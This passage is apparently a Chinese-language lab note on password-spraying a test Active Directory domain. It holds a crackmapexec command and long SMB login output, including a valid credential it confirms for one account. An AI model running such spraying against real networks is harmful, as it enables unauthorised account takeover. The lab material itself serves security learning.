    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\dollie.fayina:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\dominica.carmon:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\dorrie.paolina:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\eba.luca:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\ella.randee:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\erena.elinore:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [+] kuma.org\fara.iseabal:8F%kJ2q_cVFg 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\Administrator:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\aleda.appolonia:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\alikee.perri:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\aloise.elfrida:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\amabelle.gayle:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\andree.suki:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\angelique.hilda:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\annice.eden:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\anya.gypsy:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\audi.rosalind:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\babb.joanne:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\bambi.etta:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\bear:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\berget.celka:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\berna.raphaela:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\berny.kirby:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\bill.marylee:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\caitrin.latia:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\carey.kincaid:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\carlye.chloette:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\carmelle.libbi:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\casandra.cherrita:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\casi.hyacinth:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\cassondra.lothario:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\celeste.kelci:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\charis.kory:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\christi.nettle:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\coraline.mahalia:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\corine.celesta:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\cyndie.rhodie:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\daile.odetta:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\darlleen.dorisa:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\DefaultAccount:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\dollie.fayina:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\dominica.carmon:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\dorrie.paolina:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\eba.luca:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\ella.randee:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\erena.elinore:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [+] kuma.org\fara.iseabal:8F%kJ2q_cVFg
    ```
    的確是fara.iseabal的密碼
    :::
    
    ---
    
    先利用win2016查詢`$ net user`然後把結果存成一個file，然後-u後面帶這個file
    :::spoiler Result of Change123!
    ```bash
    $ crackmapexec smb 192.168.222.128/24 -u ./AD-user.txt -p Changeme123\!             
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True)
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\Administrator:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\aleda.appolonia:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\alikee.perri:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\aloise.elfrida:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\amabelle.gayle:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\andree.suki:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\angelique.hilda:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\annice.eden:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\anya.gypsy:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\audi.rosalind:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\babb.joanne:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\bambi.etta:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\bear:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\berget.celka:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\berna.raphaela:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\berny.kirby:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\bill.marylee:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\caitrin.latia:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\carey.kincaid:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\carlye.chloette:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\carmelle.libbi:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\casandra.cherrita:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\casi.hyacinth:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\cassondra.lothario:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\celeste.kelci:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\charis.kory:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\christi.nettle:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\coraline.mahalia:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\corine.celesta:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\cyndie.rhodie:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\daile.odetta:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\darlleen.dorisa:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\DefaultAccount:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\dollie.fayina:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\dominica.carmon:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\dorrie.paolina:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\eba.luca:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\ella.randee:Changeme123! STATUS_PASSWORD_MUST_CHANGE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\erena.elinore:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\fara.iseabal:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\fred.carmita:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\gabriel.diannne:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\garnet.constancia:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\gertrude.felecia:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\gillian.marsiella:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\giulietta.moyra:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\glenda.dorrie:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\Guest:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\henrieta.sabine:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\herminia.debby:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\issy.eudora:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\jerrie.morganne:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\jessa.corinna:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\jori.floria:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\joyann.sibella:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\kaja.brenda:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\karoly.nadeen:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\katee.annemarie:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\katharina.alyssa:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\kiri.kath:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\kizzee.margaux:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\krbtgt:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\laurena.mirelle:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\lazaro.karoly:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\lilas.lindy:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\lily.kristofor:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\lina.allene:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\linda.neda:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\logan.janeen:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\lon.sonni:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\lorne.celie:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\lucilia.lelah:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\margo.sharl:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\marlyn.loralee:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\marney.ranee:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\martita.juanita:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\marylynne.susannah:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\maurizia.ines:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\mercy.edi:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\moyra.fanechka:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\nolana.rivy:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\ollie.dorita:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\orelee.peri:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\ortensia.fancy:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\philippa.eugenie:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\philis.gilli:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\pietra.fern:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\randene.lelah:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\ranee.delinda:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\reina.claire:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\renae.babette:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\reyna.gwendolyn:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\ricca.stefa:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\ronni.kristoforo:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\rosetta.lotta:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\ruthann.britta:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\ruthie.ebony:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\seana.jeanette:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\selestina.cassi:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\shantee.marylin:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\sherri.jacquetta:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\sile.rhiamon:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\sofie.darlleen:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\star.rikki:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\stormie.natala:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\Administrator:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\aleda.appolonia:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\alikee.perri:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\aloise.elfrida:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\amabelle.gayle:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\andree.suki:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\angelique.hilda:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\annice.eden:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\anya.gypsy:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\audi.rosalind:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\babb.joanne:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\bambi.etta:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\bear:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\berget.celka:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\berna.raphaela:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\berny.kirby:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\bill.marylee:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\caitrin.latia:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\carey.kincaid:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\carlye.chloette:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\carmelle.libbi:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\casandra.cherrita:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\casi.hyacinth:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\cassondra.lothario:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\celeste.kelci:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\charis.kory:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\christi.nettle:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\coraline.mahalia:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\corine.celesta:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\cyndie.rhodie:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\daile.odetta:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\darlleen.dorisa:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\DefaultAccount:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\dollie.fayina:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\dominica.carmon:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\dorrie.paolina:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\eba.luca:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\ella.randee:Changeme123! STATUS_PASSWORD_MUST_CHANGE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\erena.elinore:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\fara.iseabal:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\fred.carmita:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\gabriel.diannne:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\garnet.constancia:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\gertrude.felecia:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\gillian.marsiella:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\giulietta.moyra:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\glenda.dorrie:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\Guest:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\henrieta.sabine:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\herminia.debby:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\issy.eudora:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\jerrie.morganne:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\jessa.corinna:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\jori.floria:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\joyann.sibella:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\kaja.brenda:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\karoly.nadeen:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\katee.annemarie:Changeme123! STATUS_LOGON_FAILURE 
